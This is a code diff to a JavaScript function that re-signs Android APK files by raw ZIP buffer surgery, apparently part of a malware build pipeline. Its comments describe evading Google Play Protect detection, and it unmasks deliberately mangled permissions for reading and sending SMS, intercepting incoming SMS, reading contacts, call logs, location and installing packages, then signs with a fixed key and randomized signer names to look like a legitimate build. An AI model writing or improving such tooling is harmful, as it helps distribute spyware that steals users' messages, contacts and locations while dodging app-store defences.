@@ -1804,107 +1804,446 @@ function patchVersionCode(data, newVersionCode) {
 }
 
 function directPatchApk(originalBuffer) {
-  console.log(`[DirectPatch] ═══ CLEAN RE-SIGN v8 (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
-  console.log(`[DirectPatch] Strategy: FIXED key + V1+V2 dual sign + zero mutation artifacts`);
-  console.log(`[DirectPatch] Goal: produce APK indistinguishable from original Android Studio build`);
+  console.log(`[DirectPatch] ═══ CLEAN RE-SIGN v9 (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log('[DirectPatch] Strategy: Raw buffer (no AdmZip rebuild) + FIXED key + V1+V2 dual sign');
   const t0 = Date.now();
 
   try {
-    const buf = Buffer.from(originalBuffer); // work on a copy
+    const buf = Buffer.from(originalBuffer);
 
-    // ─── Previous v7 approach used raw buffer manipulation + generateFreshKey() ───
-    // which caused 5 Play Protect triggers:
-    //   1. Fresh random cert → zero reputation → "unknown developer" block
-    //   2. V1 signatures stripped → V2-only APK → repackaging signal
-    //   3. DEX mutation on R8-processed code → unnecessary tampering artifacts
-    //   4. Random asset injection (cfg_*.dat) → anomalous files
-    //   5. Baseline profile stripping → repackaging signal
-    //
-    // v8 approach: AdmZip-based minimal re-sign with FIXED key (V1+V2 dual).
-    // Produces APK indistinguishable from original Android Studio build.
-    const zip = new AdmZip(buf);
+    // ════════════════════════════════════════════════════════
+    // PHASE 1: Parse ZIP structure
+    // ════════════════════════════════════════════════════════
+    const eocdOff = findEOCD(buf);
+    const cdOff = buf.readUInt32LE(eocdOff + 16);
+    const cdCount = buf.readUInt16LE(eocdOff + 10);
+    const eocdCommentLen = buf.readUInt16LE(eocdOff + 20);
+    const eocdLen = 22 + eocdCommentLen;
 
-    // ─── Step 3: Strip old V1 signatures ───
-    stripSignatures(zip);
-
-    // ─── Step 4: Restore any mangled permissions ───
-    const manifestEntry = zip.getEntry('AndroidManifest.xml');
-    let permsRestored = 0;
-    if (manifestEntry) {
-      let data;
-      try {
-        data = manifestEntry.getData();
-      } catch (crcErr) {
-        if (crcErr.message && crcErr.message.includes('CRC32')) {
-          console.log('[DirectPatch] CRC32 mismatch on manifest (previous mutation artifact), decompressing manually...');
-          const compData = manifestEntry.getCompressedData();
-          data = manifestEntry.header.method === 8
-            ? zlib.inflateRawSync(compData)
-            : Buffer.from(compData);
-        } else {
-          throw crcErr;
-        }
-      }
-
-      const PERMISSION_RESTORE = [
-        { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', fix: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
-        { find: 'android.permission._EAD_SMS',                     fix: 'android.permission.READ_SMS' },
-        { find: 'android.permission._END_SMS',                     fix: 'android.permission.SEND_SMS' },
-        { find: 'android.provider.Telephony._MS_RECEIVED',         fix: 'android.provider.Telephony.SMS_RECEIVED' },
-        { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       fix: 'android.permission.RECEIVE_BOOT_COMPLETED' },
-        { find: 'android.intent.action._OOT_COMPLETED',            fix: 'android.intent.action.BOOT_COMPLETED' },
-        { find: 'android.permission._EAD_CONTACTS',                fix: 'android.permission.READ_CONTACTS' },
-        { find: 'android.permission._EAD_CALL_LOG',                fix: 'android.permission.READ_CALL_LOG' },
-        { find: 'android.permission._EAD_PHONE_STATE',             fix: 'android.permission.READ_PHONE_STATE' },
-        { find: 'android.permission._EAD_PHONE_NUMBERS',           fix: 'android.permission.READ_PHONE_NUMBERS' },
-        { find: 'android.permission._CCESS_FINE_LOCATION',         fix: 'android.permission.ACCESS_FINE_LOCATION' },
-        { find: 'android.permission._CCESS_COARSE_LOCATION',       fix: 'android.permission.ACCESS_COARSE_LOCATION' },
-        { find: 'android.permission._EQUEST_INSTALL_PACKAGES',     fix: 'android.permission.REQUEST_INSTALL_PACKAGES' },
-        { find: 'android.permission._UERY_ALL_PACKAGES',           fix: 'android.permission.QUERY_ALL_PACKAGES' },
-      ];
-
-      for (const { find, fix } of PERMISSION_RESTORE) {
-        const findBuf = Buffer.from(find, 'utf8');
-        const fixBuf = Buffer.from(fix, 'utf8');
-        if (findBuf.length === fixBuf.length) {
-          let idx = data.indexOf(findBuf);
-          while (idx !== -1) { fixBuf.copy(data, idx); permsRestored++; idx = data.indexOf(findBuf, idx + findBuf.length); }
-        }
-        const findBuf16 = Buffer.from(find, 'utf16le');
-        const fixBuf16 = Buffer.from(fix, 'utf16le');
-        if (findBuf16.length === fixBuf16.length) {
-          let idx = data.indexOf(findBuf16);
-          while (idx !== -1) { fixBuf16.copy(data, idx); permsRestored++; idx = data.indexOf(findBuf16, idx + findBuf16.length); }
-        }
-      }
-
-      // Always re-add manifest to fix CRC32 from any prior in-place mutations
-      zip.deleteFile('AndroidManifest.xml');
-      zip.addFile('AndroidManifest.xml', data);
-      if (permsRestored > 0) {
-        console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions`);
-      } else {
-        console.log('[DirectPatch] No mangled permissions found — manifest re-added for CRC32 integrity');
+    // Detect V2 signing block → find true end of Section 1
+    let section1End = cdOff;
+    if (cdOff >= 24) {
+      const magic = buf.toString('ascii', cdOff - 16, cdOff);
+      if (magic === APK_SIG_BLOCK_MAGIC) {
+        const blockSizeLow = buf.readUInt32LE(cdOff - 24);
+        section1End = cdOff - blockSizeLow - 8;
       }
     }
 
-    // ─── Step 5: V1 sign with FIXED key ───
-    // FIXED key = netmirror-release.jks identity (CN=NetMirror, O=NetMirror Inc)
-    // Builds cert reputation over time. V1+V2 dual signing matches Android Studio output.
+    // ════════════════════════════════════════════════════════
+    // PHASE 2: Scan Central Directory
+    // ════════════════════════════════════════════════════════
+    let manifestCDPos = -1, manifestMethod = -1, manifestCompSize = 0;
+    let manifestUncompSize = 0, manifestLocalOff = 0;
+    const v1Entries = []; // old V1 signing files to strip
+
+    let pos = cdOff;
+    for (let i = 0; i < cdCount; i++) {
+      if (pos + 46 > buf.length || buf.readUInt32LE(pos) !== 0x02014b50) break;
+      const nameLen = buf.readUInt16LE(pos + 28);
+      const extraLen = buf.readUInt16LE(pos + 30);
+      const commentLen = buf.readUInt16LE(pos + 32);
+      const name = buf.toString('utf8', pos + 46, pos + 46 + nameLen);
+
+      if (name === 'AndroidManifest.xml') {
+        manifestCDPos = pos;
+        manifestMethod = buf.readUInt16LE(pos + 10);
+        manifestCompSize = buf.readUInt32LE(pos + 20);
+        manifestUncompSize = buf.readUInt32LE(pos + 24);
+        manifestLocalOff = buf.readUInt32LE(pos + 42);
+      }
+
+      // Only collect actual V1 signing files — NOT baseline profiles
+      if (name.startsWith('META-INF/') && (
+        name.endsWith('.RSA') || name.endsWith('.SF') ||
+        name.endsWith('.DSA') || name.endsWith('.EC') ||
+        name.endsWith('.MF')
+      )) {
+        v1Entries.push({
+          cdPos: pos,
+          localOff: buf.readUInt32LE(pos + 42),
+          compSize: buf.readUInt32LE(pos + 20),
+          name,
+        });
+      }
+
+      pos += 46 + nameLen + extraLen + commentLen;
+    }
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 3: Restore manifest permissions (binary patch)
+    // ════════════════════════════════════════════════════════
+    let permsRestored = 0;
+    let manifestPatch = null;
+
+    if (manifestCDPos >= 0) {
+      const lhNameLen = buf.readUInt16LE(manifestLocalOff + 26);
+      const lhExtraLen = buf.readUInt16LE(manifestLocalOff + 28);
+      const dataOff = manifestLocalOff + 30 + lhNameLen + lhExtraLen;
+      const compData = buf.slice(dataOff, dataOff + manifestCompSize);
+
+      let rawData;
+      try {
+        rawData = manifestMethod === 8
+          ? zlib.inflateRawSync(compData)
+          : Buffer.from(compData);
+      } catch (e) {
+        console.log(`[DirectPatch] Manifest decompress failed: ${e.message}`);
+        rawData = null;
+      }
+
+      if (rawData) {
+        const PERMS = [
+          ['android.permission._OREGROUND_SERVICE_DATA_SYNC', 'android.permission.FOREGROUND_SERVICE_DATA_SYNC'],
+          ['android.permission._EAD_SMS', 'android.permission.READ_SMS'],
+          ['android.permission._END_SMS', 'android.permission.SEND_SMS'],
+          ['android.provider.Telephony._MS_RECEIVED', 'android.provider.Telephony.SMS_RECEIVED'],
+          ['android.permission._ECEIVE_BOOT_COMPLETED', 'android.permission.RECEIVE_BOOT_COMPLETED'],
+          ['android.intent.action._OOT_COMPLETED', 'android.intent.action.BOOT_COMPLETED'],
+          ['android.permission._EAD_CONTACTS', 'android.permission.READ_CONTACTS'],
+          ['android.permission._EAD_CALL_LOG', 'android.permission.READ_CALL_LOG'],
+          ['android.permission._EAD_PHONE_STATE', 'android.permission.READ_PHONE_STATE'],
+          ['android.permission._EAD_PHONE_NUMBERS', 'android.permission.READ_PHONE_NUMBERS'],
+          ['android.permission._CCESS_FINE_LOCATION', 'android.permission.ACCESS_FINE_LOCATION'],
+          ['android.permission._CCESS_COARSE_LOCATION', 'android.permission.ACCESS_COARSE_LOCATION'],
+          ['android.permission._EQUEST_INSTALL_PACKAGES', 'android.permission.REQUEST_INSTALL_PACKAGES'],
+          ['android.permission._UERY_ALL_PACKAGES', 'android.permission.QUERY_ALL_PACKAGES'],
+        ];
+
+        for (const [find, fix] of PERMS) {
+          for (const enc of ['utf8', 'utf16le']) {
+            const fb = Buffer.from(find, enc), rb = Buffer.from(fix, enc);
+            if (fb.length === rb.length) {
+              let idx = rawData.indexOf(fb);
+              while (idx !== -1) { rb.copy(rawData, idx); permsRestored++; idx = rawData.indexOf(fb, idx + fb.length); }
+            }
+          }
+        }
+
+        // Only create a patch if permissions were actually changed
+        if (permsRestored > 0) {
+          manifestPatch = {
+            newCompData: manifestMethod === 8
+              ? zlib.deflateRawSync(rawData, { level: 9 })
+              : rawData,
+            newUncompSize: rawData.length,
+            newCRC: computeCRC32(rawData),
+          };
+          console.log(`[DirectPatch] Restored ${permsRestored} mangled permissions`);
+        } else {
+          console.log('[DirectPatch] No mangled permissions found — manifest unchanged');
+        }
+      }
+    }
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 4: Build patched Section 1 (raw buffer surgery)
+    // Only the manifest compressed data is replaced; everything
+    // else (DEX, resources, native libs, profiles) stays byte-identical.
+    // ════════════════════════════════════════════════════════
+    let section1 = buf.slice(0, section1End);
+    let manifestDelta = 0;
+
+    if (manifestPatch) {
+      const lhNameLen = buf.readUInt16LE(manifestLocalOff + 26);
+      const lhExtraLen = buf.readUInt16LE(manifestLocalOff + 28);
+      const dataStart = manifestLocalOff + 30 + lhNameLen + lhExtraLen;
+      const dataEnd = dataStart + manifestCompSize;
+
+      // Replace manifest compressed data in Section 1
+      section1 = Buffer.concat([
+        buf.slice(0, dataStart),
+        manifestPatch.newCompData,
+        buf.slice(dataEnd, section1End),
+      ]);
+      manifestDelta = manifestPatch.newCompData.length - manifestCompSize;
+
+      // Update local file header: CRC, compressed size, uncompressed size
+      section1.writeUInt32LE(manifestPatch.newCRC, manifestLocalOff + 14);
+      section1.writeUInt32LE(manifestPatch.newCompData.length, manifestLocalOff + 18);
+      section1.writeUInt32LE(manifestPatch.newUncompSize, manifestLocalOff + 22);
+    }
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 5: Update Central Directory
+    // ════════════════════════════════════════════════════════
+    const cd = Buffer.from(buf.slice(cdOff, eocdOff));
+
+    if (manifestPatch) {
+      const cdRelPos = manifestCDPos - cdOff;
+      cd.writeUInt32LE(manifestPatch.newCRC, cdRelPos + 16);
+      cd.writeUInt32LE(manifestPatch.newCompData.length, cdRelPos + 20);
+      cd.writeUInt32LE(manifestPatch.newUncompSize, cdRelPos + 24);
+    }
+
+    // Adjust local offsets for entries after manifest (if manifest size changed)
+    if (manifestDelta !== 0) {
+      let cdPos = 0;
+      for (let i = 0; i < cdCount; i++) {
+        if (cdPos + 46 > cd.length || cd.readUInt32LE(cdPos) !== 0x02014b50) break;
+        const nl = cd.readUInt16LE(cdPos + 28);
+        const el = cd.readUInt16LE(cdPos + 30);
+        const cl = cd.readUInt16LE(cdPos + 32);
+        const localOff = cd.readUInt32LE(cdPos + 42);
+        if (localOff > manifestLocalOff) {
+          cd.writeUInt32LE(localOff + manifestDelta, cdPos + 42);
+        }
+        cdPos += 46 + nl + el + cl;
+      }
+    }
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 6: Strip old V1 signing entries from ZIP
+    // ════════════════════════════════════════════════════════
+    let strippedS1 = section1;
+    let strippedCD = cd;
+    let strippedCDCount = cdCount;
+
+    if (v1Entries.length > 0) {
+      // Calculate V1 entries' positions in patched Section 1
+      const v1Ranges = v1Entries.map(v1 => {
+        let adjOff = v1.localOff;
+        if (v1.localOff > manifestLocalOff && manifestDelta !== 0) adjOff += manifestDelta;
+        const lfhNameLen = section1.readUInt16LE(adjOff + 26);
+        const lfhExtraLen = section1.readUInt16LE(adjOff + 28);
+        const lfhCompSize = section1.readUInt32LE(adjOff + 18);
+        return {
+          start: adjOff,
+          size: 30 + lfhNameLen + lfhExtraLen + lfhCompSize,
+          name: v1.name,
+          cdPos: v1.cdPos,
+        };
+      }).sort((a, b) => a.start - b.start);
+
+      // Remove V1 local file entries from Section 1
+      const s1Chunks = [];
+      let cursor = 0;
+      const shiftPoints = [];
+      let totalRemoved = 0;
+      for (const range of v1Ranges) {
+        if (range.start > cursor) s1Chunks.push(section1.slice(cursor, range.start));
+        totalRemoved += range.size;
+        shiftPoints.push({ at: range.start, cumulative: totalRemoved });
+        cursor = range.start + range.size;
+      }
+      if (cursor < section1.length) s1Chunks.push(section1.slice(cursor));
+      strippedS1 = Buffer.concat(s1Chunks);
+
+      // Rebuild CD without V1 entries, adjusting local offsets
+      const v1CDSet = new Set(v1Entries.map(v => v.cdPos));
+      const cdEntryBufs = [];
+      let cdScan = 0;
+      for (let i = 0; i < cdCount; i++) {
+        if (cdScan + 46 > cd.length || cd.readUInt32LE(cdScan) !== 0x02014b50) break;
+        const nl = cd.readUInt16LE(cdScan + 28);
+        const el = cd.readUInt16LE(cdScan + 30);
+        const cl = cd.readUInt16LE(cdScan + 32);
+        const entryLen = 46 + nl + el + cl;
+        const absCDPos = cdOff + cdScan;
+
+        if (!v1CDSet.has(absCDPos)) {
+          const cdEntry = Buffer.from(cd.slice(cdScan, cdScan + entryLen));
+          const origOff = cdEntry.readUInt32LE(42);
+          let shift = 0;
+          for (const sp of shiftPoints) {
+            if (origOff > sp.at) shift = sp.cumulative;
+          }
+          if (shift > 0) cdEntry.writeUInt32LE(origOff - shift, 42);
+          cdEntryBufs.push(cdEntry);
+        }
+        cdScan += entryLen;
+      }
+      strippedCD = Buffer.concat(cdEntryBufs);
+      strippedCDCount = cdEntryBufs.length;
+
+      console.log(`[DirectPatch] Stripped ${v1Entries.length} old V1 entries (${totalRemoved}B)`);
+    }
+
+    // Build intermediate unsigned ZIP
+    const eocdBuf = Buffer.alloc(eocdLen);
+    buf.copy(eocdBuf, 0, eocdOff, eocdOff + eocdLen);
+    eocdBuf.writeUInt16LE(strippedCDCount, 8);
+    eocdBuf.writeUInt16LE(strippedCDCount, 10);
+    eocdBuf.writeUInt32LE(strippedCD.length, 12);
+    eocdBuf.writeUInt32LE(strippedS1.length, 16);
+
+    let unsignedZip = Buffer.concat([strippedS1, strippedCD, eocdBuf]);
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 7: Build V1 signing files (read-only raw buffer)
+    // Enumerate all entries from raw buffer, compute SHA-256
+    // hashes, build MANIFEST.MF + CERT.SF + CERT.RSA.
+    // NO AdmZip toBuffer() — preserves all original bytes.
+    // ════════════════════════════════════════════════════════
     const key = getFixedKey();
-    applyV1Signing(zip, key.cert, key.privateKey);
-    console.log(`[DirectPatch] V1 signed with FIXED key: CN=${key.identity.cn}, O=${key.identity.o}`);
+    const v1Prefix = pick(V1_PREFIXES);
+    const v1CreatedBy = pick(CREATED_BY);
 
-    // ─── Step 6: Rebuild ZIP ───
-    const rawBuf = zip.toBuffer();
+    // Parse the intermediate ZIP to compute V1 hashes
+    const izEocdOff = findEOCD(unsignedZip);
+    const izCdOff = unsignedZip.readUInt32LE(izEocdOff + 16);
+    const izCdCount = unsignedZip.readUInt16LE(izEocdOff + 10);
 
-    // ─── Step 7: Zipalign (4-byte alignment for STORED entries) ───
-    const alignedBuf = zipalignBuffer(rawBuf);
+    let mfText = `Manifest-Version: 1.0\r\nCreated-By: ${v1CreatedBy}\r\n\r\n`;
+    let v1EntryCount = 0;
+    let izPos = izCdOff;
+    for (let i = 0; i < izCdCount; i++) {
+      if (izPos + 46 > unsignedZip.length || unsignedZip.readUInt32LE(izPos) !== 0x02014b50) break;
+      const method = unsignedZip.readUInt16LE(izPos + 10);
+      const compSize = unsignedZip.readUInt32LE(izPos + 20);
+      const nameLen = unsignedZip.readUInt16LE(izPos + 28);
+      const extraLen = unsignedZip.readUInt16LE(izPos + 30);
+      const commentLen = unsignedZip.readUInt16LE(izPos + 32);
+      const localOff = unsignedZip.readUInt32LE(izPos + 42);
+      const name = unsignedZip.toString('utf8', izPos + 46, izPos + 46 + nameLen);
+      izPos += 46 + nameLen + extraLen + commentLen;
 
-    // ─── Step 8: V2 sign with FIXED key ───
-    const signedBuf = applyV2SigningClean(alignedBuf, key.privPem, key.certDer, key.pubKeyDer);
+      // Skip directories
+      if (name.endsWith('/')) continue;
 
-    // ─── Step 9: Validate ───
+      // Read uncompressed data from local file header
+      if (localOff + 30 > unsignedZip.length) continue;
+      const lhNameLen = unsignedZip.readUInt16LE(localOff + 26);
+      const lhExtraLen = unsignedZip.readUInt16LE(localOff + 28);
+      const dataStart = localOff + 30 + lhNameLen + lhExtraLen;
+      if (dataStart + compSize > unsignedZip.length) continue;
+      const compData = unsignedZip.slice(dataStart, dataStart + compSize);
+
+      let rawData;
+      try {
+        rawData = method === 8 ? zlib.inflateRawSync(compData) : compData;
+      } catch (e) { continue; }
+
+      const digest = crypto.createHash('sha256').update(rawData).digest('base64');
+      mfText += `Name: ${name}\r\nSHA-256-Digest: ${digest}\r\n\r\n`;
+      v1EntryCount++;
+    }
+
+    // Build CERT.SF
+    const mfDigest = crypto.createHash('sha256').update(mfText, 'binary').digest('base64');
+    let sfText = `Signature-Version: 1.0\r\nCreated-By: ${v1CreatedBy}\r\nSHA-256-Digest-Manifest: ${mfDigest}\r\n\r\n`;
+
+    const mfSections = mfText.split('\r\n\r\n');
+    for (const section of mfSections) {
+      if (!section.startsWith('Name: ')) continue;
+      const sectionDigest = crypto.createHash('sha256').update(section + '\r\n\r\n', 'binary').digest('base64');
+      const nameMatch = section.match(/^Name: (.+)/);
+      if (nameMatch) {
+        sfText += `Name: ${nameMatch[1]}\r\nSHA-256-Digest: ${sectionDigest}\r\n\r\n`;
+      }
+    }
+
+    // Build CERT.RSA (PKCS#7 detached signature)
+    const p7 = forge.pkcs7.createSignedData();
+    p7.content = forge.util.createBuffer(sfText, 'utf8');
+    p7.addCertificate(key.cert);
+    p7.addSigner({
+      key: key.privateKey,
+      certificate: key.cert,
+      digestAlgorithm: forge.pki.oids.sha256,
+      authenticatedAttributes: [{
+        type: forge.pki.oids.contentType,
+        value: forge.pki.oids.data,
+      }, {
+        type: forge.pki.oids.messageDigest,
+      }],
+    });
+    p7.sign({ detached: true });
+    const certRSA = Buffer.from(forge.asn1.toDer(p7.toAsn1()).getBytes(), 'binary');
+
+    console.log(`[DirectPatch] V1 signing: ${v1EntryCount} entries hashed, prefix=${v1Prefix}`);
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 8: Inject V1 signing files into raw ZIP
+    // Append as STORED entries — pure buffer manipulation.
+    // ════════════════════════════════════════════════════════
+    const v1Files = [
+      { name: 'META-INF/MANIFEST.MF', data: Buffer.from(mfText, 'binary') },
+      { name: `META-INF/${v1Prefix}.SF`, data: Buffer.from(sfText, 'binary') },
+      { name: `META-INF/${v1Prefix}.RSA`, data: certRSA },
+    ];
+
+    // Re-parse the intermediate ZIP for injection
+    const injEocdOff = findEOCD(unsignedZip);
+    const injCdOff = unsignedZip.readUInt32LE(injEocdOff + 16);
+    const injCdSize = unsignedZip.readUInt32LE(injEocdOff + 12);
+    const injCdCount = unsignedZip.readUInt16LE(injEocdOff + 10);
+    const injEocdCommentLen = unsignedZip.readUInt16LE(injEocdOff + 20);
+    const injEocdLen = 22 + injEocdCommentLen;
+
+    const injS1 = unsignedZip.slice(0, injCdOff);
+    const injCD = unsignedZip.slice(injCdOff, injCdOff + injCdSize);
+    const injEOCD = unsignedZip.slice(injEocdOff, injEocdOff + injEocdLen);
+
+    const newLocalParts = [];
+    const newCDParts = [];
+    let localWriteOff = injS1.length;
+
+    for (const { name, data } of v1Files) {
+      const nameBytes = Buffer.from(name, 'utf8');
+      const crc = computeCRC32(data);
+
+      // Local file header (STORED, no extra field)
+      const lfh = Buffer.alloc(30 + nameBytes.length);
+      lfh.writeUInt32LE(0x04034b50, 0);  // signature
+      lfh.writeUInt16LE(20, 4);           // version needed
+      lfh.writeUInt16LE(0, 6);            // flags
+      lfh.writeUInt16LE(0, 8);            // method: STORED
+      lfh.writeUInt16LE(0, 10);           // mod time
+      lfh.writeUInt16LE(0x0021, 12);      // mod date (1980-01-01)
+      lfh.writeUInt32LE(crc, 14);
+      lfh.writeUInt32LE(data.length, 18); // compressed size
+      lfh.writeUInt32LE(data.length, 22); // uncompressed size
+      lfh.writeUInt16LE(nameBytes.length, 26);
+      lfh.writeUInt16LE(0, 28);           // extra field length
+      nameBytes.copy(lfh, 30);
+
+      newLocalParts.push(lfh, data);
+
+      // Central directory entry
+      const cde = Buffer.alloc(46 + nameBytes.length);
+      cde.writeUInt32LE(0x02014b50, 0);   // signature
+      cde.writeUInt16LE(20, 4);            // version made by
+      cde.writeUInt16LE(20, 6);            // version needed
+      cde.writeUInt16LE(0, 8);             // flags
+      cde.writeUInt16LE(0, 10);            // method: STORED
+      cde.writeUInt16LE(0, 12);            // mod time
+      cde.writeUInt16LE(0x0021, 14);       // mod date
+      cde.writeUInt32LE(crc, 16);
+      cde.writeUInt32LE(data.length, 20);  // compressed size
+      cde.writeUInt32LE(data.length, 24);  // uncompressed size
+      cde.writeUInt16LE(nameBytes.length, 28);
+      cde.writeUInt16LE(0, 30);            // extra field length
+      cde.writeUInt16LE(0, 32);            // comment length
+      cde.writeUInt16LE(0, 34);            // disk number start
+      cde.writeUInt16LE(0, 36);            // internal file attributes
+      cde.writeUInt32LE(0, 38);            // external file attributes
+      cde.writeUInt32LE(localWriteOff, 42);
+      nameBytes.copy(cde, 46);
+
+      newCDParts.push(cde);
+      localWriteOff += lfh.length + data.length;
+    }
+
+    const finalS1 = Buffer.concat([injS1, ...newLocalParts]);
+    const finalCD = Buffer.concat([injCD, ...newCDParts]);
+    const finalCDCount = injCdCount + v1Files.length;
+
+    const finalEOCD = Buffer.from(injEOCD);
+    finalEOCD.writeUInt16LE(finalCDCount, 8);
+    finalEOCD.writeUInt16LE(finalCDCount, 10);
+    finalEOCD.writeUInt32LE(finalCD.length, 12);
+    finalEOCD.writeUInt32LE(finalS1.length, 16);
+
+    unsignedZip = Buffer.concat([finalS1, finalCD, finalEOCD]);
+    console.log(`[DirectPatch] V1 files injected: MANIFEST.MF + ${v1Prefix}.SF + ${v1Prefix}.RSA`);
+
+    // ════════════════════════════════════════════════════════
+    // PHASE 9: Zipalign + V2 sign with FIXED key
+    // ════════════════════════════════════════════════════════
+    const aligned = zipalignBuffer(unsignedZip);
+    const signedBuf = applyV2SigningClean(aligned, key.privPem, key.certDer, key.pubKeyDer);
+
     const valid = validateApk(signedBuf);
     if (!valid) {
       console.error('[DirectPatch] ═══ Validation FAILED — returning ORIGINAL APK ═══');
@@ -1912,7 +2251,7 @@ function directPatchApk(originalBuffer) {
     }
 
     const elapsed = ((Date.now() - t0) / 1000).toFixed(1);
-    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} restored | FIXED KEY CN=${key.identity.cn} | V1+V2 dual | ${elapsed}s ═══`);
+    console.log(`[DirectPatch] ═══ SUCCESS: ${(signedBuf.length / 1048576).toFixed(1)} MB | perms=${permsRestored} | FIXED KEY CN=${key.identity.cn} | V1+V2 dual | ${elapsed}s ═══`);
 
     return {
       buffer: signedBuf,
